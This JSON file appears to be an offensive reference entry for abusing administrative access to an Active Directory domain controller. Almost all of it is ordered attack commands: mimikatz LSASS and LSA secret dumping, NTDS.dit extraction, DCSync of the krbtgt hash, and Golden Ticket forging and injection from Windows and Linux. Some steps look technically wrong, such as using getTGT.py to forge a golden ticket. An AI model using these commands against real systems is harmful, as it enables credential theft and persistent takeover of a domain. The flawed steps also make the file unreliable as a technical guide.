{
    "DCFor": {
        "meaning": "This edge indicates that the computer is a domain controller for the domain. This edge is not created for read-only domain controllers. Domain Controllers store all Active Directory credentials and configurations for all principals in the domain. If an adversary gains administrative access to a Domain Controller, there are several options at their disposal for compromising domain identities and domain-managed systems.",
        "common": "",
        "windows": {
            "Credential_Extraction": [
                {
                    "order": 1,
                    "command": "privilege::debug",
                    "description": "Enable debug privilege in mimikatz for LSASS access"
                },
                {
                    "order": 2,
                    "command": "sekurlsa::logonpasswords",
                    "description": "Extract all cached credentials from LSASS memory on DC"
                },
                {
                    "order": 3,
                    "command": "lsadump::secrets",
                    "description": "Dump LSA secrets including service account passwords"
                },
                {
                    "order": 4,
                    "command": "lsadump::cache",
                    "description": "Extract cached domain credentials from registry"
                }
            ],
            "NTDS_Database_Extraction": [
                {
                    "order": 1,
                    "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\\ntds\" q q",
                    "description": "Create NTDS database backup using ntdsutil"
                },
                {
                    "order": 2,
                    "command": "reg save HKLM\\SYSTEM c:\\temp\\system.hive",
                    "description": "Save SYSTEM registry hive for key extraction"
                },
                {
                    "order": 3,
                    "command": "secretsdump.py -ntds ntds.dit -system system.hive LOCAL",
                    "description": "Extract all domain hashes from NTDS database offline"
                }
            ],
            "Domain_Persistence": [
                {
                    "order": 1,
                    "command": "lsadump::dcsync /domain:domain.com /user:krbtgt",
                    "description": "Extract krbtgt hash for Golden Ticket creation"
                },
                {
                    "order": 2,
                    "command": "kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi",
                    "description": "Create Golden Ticket for persistent domain access"
                },
                {
                    "order": 3,
                    "command": "kerberos::ptt golden.kirbi",
                    "description": "Inject Golden Ticket for immediate domain admin access"
                }
            ]
        },
        "linux": {
            "Remote_Credential_Extraction": [
                {
                    "order": 1,
                    "command": "secretsdump.py domain/admin:password@dc.domain.com",
                    "description": "Extract all domain credentials via DCSync from Linux"
                },
                {
                    "order": 2,
                    "command": "secretsdump.py domain/admin:password@dc.domain.com -just-dc-user krbtgt",
                    "description": "Extract krbtgt hash specifically for Golden Ticket attacks"
                },
                {
                    "order": 3,
                    "command": "secretsdump.py domain/admin:password@dc.domain.com -outputfile domain_hashes",
                    "description": "Save all extracted domain hashes to files"
                }
            ],
            "NTDS_Remote_Extraction": [
                {
                    "order": 1,
                    "command": "smbclient //dc.domain.com/c$ -U 'domain/admin%password' -c 'get ntds.dit'",
                    "description": "Download NTDS database file via SMB if accessible"
                },
                {
                    "order": 2,
                    "command": "smbclient //dc.domain.com/c$ -U 'domain/admin%password' -c 'get windows/system32/config/system'",
                    "description": "Download SYSTEM registry hive for key extraction"
                },
                {
                    "order": 3,
                    "command": "secretsdump.py -ntds ntds.dit -system system LOCAL",
                    "description": "Process NTDS database offline to extract all domain hashes"
                }
            ],
            "Golden_Ticket_Creation": [
                {
                    "order": 1,
                    "command": "getTGT.py domain.com/krbtgt -hashes :KRBTGT_HASH",
                    "description": "Create TGT using extracted krbtgt hash"
                },
                {
                    "order": 2,
                    "command": "ticketConverter.py ticket.ccache ticket.kirbi",
                    "description": "Convert ticket format for cross-platform compatibility"
                },
                {
                    "order": 3,
                    "command": "export KRB5CCNAME=ticket.ccache",
                    "description": "Set Kerberos credential cache for persistent access"
                }
            ]
        }
    }
}
